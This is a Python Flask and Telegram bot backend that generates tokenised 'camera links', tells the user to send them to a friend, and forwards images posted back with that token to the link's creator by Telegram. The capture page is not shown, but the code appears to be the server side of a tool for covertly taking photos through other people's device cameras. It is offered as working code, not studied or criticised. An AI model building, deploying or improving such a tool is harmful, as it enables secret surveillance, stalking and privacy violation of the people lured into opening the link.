import os
import base64
import uuid
import asyncio
import psycopg2
from datetime import datetime, timezone
from flask import Flask, request, jsonify
from flask_cors import CORS
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ==================== CONFIG ====================
BOT_TOKEN = os.environ['BOT_TOKEN']
PORT = int(os.getenv('PORT', 10000))
SITE_URL = os.getenv('SITE_URL', 'https://your-site.netlify.app')
RENDER_URL = os.getenv('RENDER_EXTERNAL_URL', '')
DATABASE_URL = os.environ['DATABASE_URL']

app = Flask(__name__)
CORS(app)

tg_app = None


# ==================== DATABASE ====================
def db_conn():
    url = DATABASE_URL
    if url.startswith('postgres://'):
        url = url.replace('postgres://', 'postgresql://', 1)
    return psycopg2.connect(url)


def init_token_db():
    try:
        conn = db_conn()
        cur = conn.cursor()
        cur.execute('''
            CREATE TABLE IF NOT EXISTS tokens (
                token VARCHAR(64) PRIMARY KEY,
                user_id BIGINT,
                created TIMESTAMP
            )
        ''')
        conn.commit()
        cur.close()
        conn.close()
        print("✅ Token table ready")
    except Exception as e:
        print(f"DB init error: {e}")


def save_token(token, user_id):
    try:
        conn = db_conn()
        cur = conn.cursor()
        cur.execute(
            '''INSERT INTO tokens (token, user_id, created) 
               VALUES (%s, %s, %s)
               ON CONFLICT (token) DO UPDATE SET user_id=EXCLUDED.user_id''',
            (token, user_id, datetime.now(timezone.utc))
        )
        conn.commit()
        cur.close()
        conn.close()
    except Exception as e:
        print(f"Save token error: {e}")


def get_token_user(token):
    try:
        conn = db_conn()
        cur = conn.cursor()
        cur.execute('SELECT user_id FROM tokens WHERE token=%s', (token,))
        r = cur.fetchone()
        cur.close()
        conn.close()
        return r[0] if r else None
    except Exception as e:
        print(f"Get token error: {e}")
        return None


def token_exists(token):
    return get_token_user(token) is not None


# ==================== BOT HANDLERS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    keyboard = [[InlineKeyboardButton("🔗 Generate Link", callback_data='genlink')]]
    await update.message.reply_text(
        f"👋 Hi {u.first_name or 'User'}!\n\n"
        f"Tap to generate a camera link:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def genlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()

    uid = q.from_user.id
    token = str(uuid.uuid4()).replace('-', '')[:12]
    save_token(token, uid)

    link = f"{SITE_URL}?token={token}"

    await q.edit_message_text(
        f"🔗 Your Camera Link:\n\n"
        f"{link}\n\n"
        f"📤 Copy karke friend ko bhejo.",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Open Link", url=link)]])
    )


# ==================== FLASK ROUTES ====================
@app.route('/', methods=['GET'])
def health():
    return "OK", 200


@app.route('/api/verify-token', methods=['POST'])
def verify_token():
    data = request.json
    token = data.get('token')
    if token_exists(token):
        return jsonify({'valid': True})
    return jsonify({'valid': False}), 404


@app.route('/api/upload', methods=['POST'])
def upload_photo():
    try:
        data = request.json
        token = data.get('token')
        image_b64 = data.get('image')

        target_user = get_token_user(token)
        if target_user is None:
            return jsonify({'error': 'invalid token'}), 400

        if ',' in image_b64:
            image_b64 = image_b64.split(',')[1]

        image_bytes = base64.b64decode(image_b64)

        filename = f"/tmp/photo_{token}_{int(datetime.now().timestamp())}.jpg"
        with open(filename, 'wb') as f:
            f.write(image_bytes)

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        async def send():
            bot = Bot(token=BOT_TOKEN)
            async with bot:
                with open(filename, 'rb') as f:
                    await bot.send_photo(
                        chat_id=target_user,
                        photo=f,
                        caption=f"📸 Photo received\n\n"
                                f"🕐 {datetime.now().strftime('%d %b %Y, %I:%M %p')}"
                    )

        loop.run_until_complete(send())
        loop.close()

        try:
            os.remove(filename)
        except:
            pass

        return jsonify({'status': 'success'})

    except Exception as e:
        print(f"Upload error: {e}")
        return jsonify({'error': str(e)}), 500


# ==================== WEBHOOK ====================
@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
def webhook():
    try:
        update_data = request.get_json(force=True)
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        async def process():
            if tg_app is None:
                return
            update = Update.de_json(update_data, tg_app.bot)
            await tg_app.initialize()
            await tg_app.process_update(update)

        loop.run_until_complete(process())
        loop.close()
    except Exception as e:
        print(f"Webhook error: {e}")
    return "OK", 200


# ==================== SETUP WEBHOOK ====================
def set_telegram_webhook():
    if not RENDER_URL:
        print("RENDER_EXTERNAL_URL not set")
        return
    import requests
    webhook_url = f"{RENDER_URL}/webhook/{BOT_TOKEN}"
    try:
        r = requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook",
            params={'url': webhook_url, 'drop_pending_updates': 'true'},
            timeout=15
        )
        print(f"Webhook set: {r.json()}")
    except Exception as e:
        print(f"Webhook setup failed: {e}")


# ==================== MAIN ====================
if __name__ == '__main__':
    init_token_db()

    tg_app = Application.builder().token(BOT_TOKEN).build()
    tg_app.add_handler(CommandHandler('start', start))
    tg_app.add_handler(CallbackQueryHandler(genlink, pattern='genlink'))

    print("🤖 Bot initialized (PostgreSQL mode)")

    set_telegram_webhook()

    app.run(host='0.0.0.0', port=PORT)
